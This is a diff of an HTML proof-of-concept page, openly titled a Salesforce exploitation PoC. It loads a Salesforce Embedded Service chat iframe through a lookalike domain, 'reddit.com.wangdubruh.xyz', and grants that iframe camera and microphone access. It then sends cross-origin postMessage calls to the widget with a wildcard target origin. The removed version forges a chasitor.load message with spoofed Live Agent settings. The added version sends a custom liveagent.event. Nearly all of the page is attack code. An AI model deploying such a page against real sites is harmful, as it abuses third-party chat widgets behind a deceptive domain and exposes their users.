@@ -1,53 +1,40 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Salesforce Iframe Exploitation PoC</title>
+  <title>Salesforce Exploitation PoC</title>
 </head>
 <body>
-  <h2>Salesforce PoC - chasitor.load simulation</h2>
+  <h2>PoC: Controlled Message to Salesforce iframe</h2>
 
   <iframe
     id="eswFrame"
-    src="https://reddit.com.wangdubruh.xyz"  <!-- Your proxied ESW 4.0 iframe -->
-    onload="runPoC()"
+    src="https://reddit.com.wangdubruh.xyz"
     style="width:600px;height:400px;border:1px solid black"
+    onload="runPoC()"
     allow="camera *; microphone *;"
   ></iframe>
 
   <script>
     function runPoC() {
-      console.log("[+] Iframe loaded (Salesforce 4.0)");
-
       const iframe = document.getElementById("eswFrame").contentWindow;
 
-      // Send script.load for features
+      console.log("[+] Iframe loaded (Salesforce 4.0)");
+
+      // Message 1: Load basic features
       ["chasitor", "filetransfer"].forEach(feature => {
-        console.log(`📤 Sending script.load for feature: ${feature}`);
+        console.log(`📤 Sending script.load for feature: '${feature}'`);
         iframe.postMessage({ method: "script.load", feature }, "*");
       });
 
-      // Simulated chasitor.load payload with mock settings
+      // Message 2: Send a fake but harmless event to confirm message handling
       setTimeout(() => {
-        const mockSettings = {
-          settingsObj: {
-            chasitorSrc: "https://service.force.com/embeddedservice/5.0/esw.min.js",
-            endpointURL: "https://d.la2-c1cs-ia4.salesforceliveagent.com/chat",
-            contentServerURL: "https://c.la2-c1cs-ia4.salesforceliveagent.com/content",
-            orgId: "00Dxx0000001gEREAY",  // fake org
-            deploymentId: "572xx000000L6gRAAS", // fake deployment
-            buttonId: "573xx000000L6gRAAS", // fake button
-            visitorInfo: { visitCount: 1, originalReferrer: "https://reddit.com", pages: [] }
-          },
-          hasOnlyExtraPrechatInfo: false,
-          prechatFormDetails: [],
-          prechatEntities: []
-        };
-
-        console.log("📤 Sending chasitor.load with mock settings");
+        console.log("📤 Sending fake liveagent.event to iframe");
         iframe.postMessage({
-          method: "chasitor.load",
-          domain: "reddit.com.wangdubruh.xyz",
-          data: mockSettings
+          method: "liveagent.event",
+          data: {
+            event: "customEventName",
+            params: { key1: "value1", key2: "value2" }
+          }
         }, "*");
       }, 1000);
     }
